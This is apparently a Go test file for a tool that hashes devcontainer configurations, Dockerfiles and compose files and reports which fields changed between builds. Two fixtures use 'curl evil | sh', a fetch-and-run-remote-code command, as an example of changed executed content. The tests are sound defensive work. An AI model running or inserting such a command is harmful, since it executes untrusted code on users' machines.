package guard

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

func digest(t *testing.T, merged string, files map[string]string) Digest {
	t.Helper()
	dir := t.TempDir()
	config := filepath.Join(dir, ".devcontainer", "devcontainer.json")
	if err := os.MkdirAll(filepath.Dir(config), 0o755); err != nil {
		t.Fatal(err)
	}
	var paths []string
	for name, content := range files {
		p := filepath.Join(filepath.Dir(config), name)
		if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
		paths = append(paths, p)
	}
	d, err := DigestOf([]byte(merged), config, paths)
	if err != nil {
		t.Fatalf("DigestOf: %v", err)
	}
	return d
}

func TestDigestIsStableForTheSameConfiguration(t *testing.T) {
	a := digest(t, `{"image":"ubuntu","features":{"x":{}}}`, nil)
	b := digest(t, `{"features":{"x":{}},  "image":"ubuntu"}`, nil)
	if a.Sum != b.Sum {
		t.Errorf("reordered keys changed the digest: %s vs %s", a.Sum, b.Sum)
	}
	if !strings.HasPrefix(a.Sum, "sha256:") {
		t.Errorf("sum %q has no algorithm prefix", a.Sum)
	}
}

// configFilePath is where the CLI found the file — on every invocation of a
// generated or merged document that is a fresh temporary directory, so it must
// not count as a change.
func TestDigestIgnoresWhereTheConfigWasRead(t *testing.T) {
	a := digest(t, `{"image":"ubuntu","configFilePath":{"fsPath":"/tmp/dev-override-1/devcontainer.json"}}`, nil)
	b := digest(t, `{"image":"ubuntu","configFilePath":{"fsPath":"/tmp/dev-override-2/devcontainer.json"}}`, nil)
	if a.Sum != b.Sum {
		t.Error("the config's temporary path changed the digest")
	}
}

func TestDigestChangesWithWhatRuns(t *testing.T) {
	base := digest(t, `{"image":"ubuntu","features":{"x":{"v":"1"}}}`, nil)
	for name, other := range map[string]Digest{
		"feature option": digest(t, `{"image":"ubuntu","features":{"x":{"v":"2"}}}`, nil),
		"init command":   digest(t, `{"image":"ubuntu","features":{"x":{"v":"1"}},"initializeCommand":"curl evil | sh"}`, nil),
	} {
		if other.Sum == base.Sum {
			t.Errorf("%s did not change the digest", name)
		}
	}
}

// A Dockerfile's RUN line is as much what runs as initializeCommand is.
func TestDigestCoversTheDockerfile(t *testing.T) {
	merged := `{"build":{"dockerfile":"Dockerfile"}}`
	a := digest(t, merged, map[string]string{"Dockerfile": "FROM ubuntu\n"})
	b := digest(t, merged, map[string]string{"Dockerfile": "FROM ubuntu\nRUN curl evil | sh\n"})
	if a.Sum == b.Sum {
		t.Error("a changed Dockerfile did not change the digest")
	}
	if !slices.Contains(a.Files, "Dockerfile") {
		t.Errorf("files = %v, want the Dockerfile named", a.Files)
	}
}

func TestDigestCoversComposeFiles(t *testing.T) {
	merged := `{"dockerComposeFile":"compose.yml","service":"app"}`
	a := digest(t, merged, map[string]string{"compose.yml": "services: {app: {image: x}}\n"})
	b := digest(t, merged, map[string]string{"compose.yml": "services: {app: {image: x, privileged: true}}\n"})
	if a.Sum == b.Sum {
		t.Error("a changed compose file did not change the digest")
	}
}

// What changed is said in terms the operator can act on: which fields of the
// configuration, which files.
func TestDiffNamesWhatChanged(t *testing.T) {
	merged := `{"build":{"dockerfile":"Dockerfile"},"image":"a","remoteUser":"vscode"}`
	a := digest(t, merged, map[string]string{"Dockerfile": "FROM a\n"})
	b := digest(t, `{"build":{"dockerfile":"Dockerfile"},"image":"b","remoteUser":"vscode","runArgs":["--x"]}`,
		map[string]string{"Dockerfile": "FROM b\n"})
	got := Diff(a, b)
	for _, want := range []string{"image", "runArgs", "Dockerfile"} {
		if !slices.Contains(got, want) {
			t.Errorf("Diff = %v, lacks %q", got, want)
		}
	}
	if slices.Contains(got, "remoteUser") {
		t.Errorf("Diff = %v names an unchanged field", got)
	}
}

func TestDigestOfAMissingDockerfileIsAnError(t *testing.T) {
	dir := t.TempDir()
	config := filepath.Join(dir, "devcontainer.json")
	if _, err := DigestOf([]byte(`{"build":{"dockerfile":"Dockerfile"}}`), config, nil); err == nil {
		t.Error("a Dockerfile that is not there was digested as if absent")
	}
}

// A stored record compares like the digest it came from, so a rebuild can name
// what changed since create without dev keeping a copy of the document.
func TestRecordRoundTripsForDiff(t *testing.T) {
	merged := `{"build":{"dockerfile":"Dockerfile"},"image":"a","remoteUser":"vscode"}`
	stored := digest(t, merged, map[string]string{"Dockerfile": "FROM a\n"})
	back := ParseRecord(stored.Sum, stored.Record())
	if back.Sum != stored.Sum || len(Diff(back, stored)) != 0 {
		t.Errorf("round trip differs: %v", Diff(back, stored))
	}
	live := digest(t, `{"build":{"dockerfile":"Dockerfile"},"image":"b","remoteUser":"vscode"}`,
		map[string]string{"Dockerfile": "FROM a\n"})
	if got := Diff(back, live); !slices.Equal(got, []string{"image"}) {
		t.Errorf("Diff = %v, want [image]", got)
	}
	// Hashes, not the document: nothing of the value is kept.
	if strings.Contains(stored.Record(), "vscode") {
		t.Errorf("the record holds a field's value: %s", stored.Record())
	}
}

func TestParseRecordOfNothingDiffsAsAllNew(t *testing.T) {
	live := digest(t, `{"image":"a"}`, nil)
	if got := Diff(ParseRecord("sha256:x", ""), live); !slices.Equal(got, []string{"image"}) {
		t.Errorf("Diff = %v", got)
	}
}
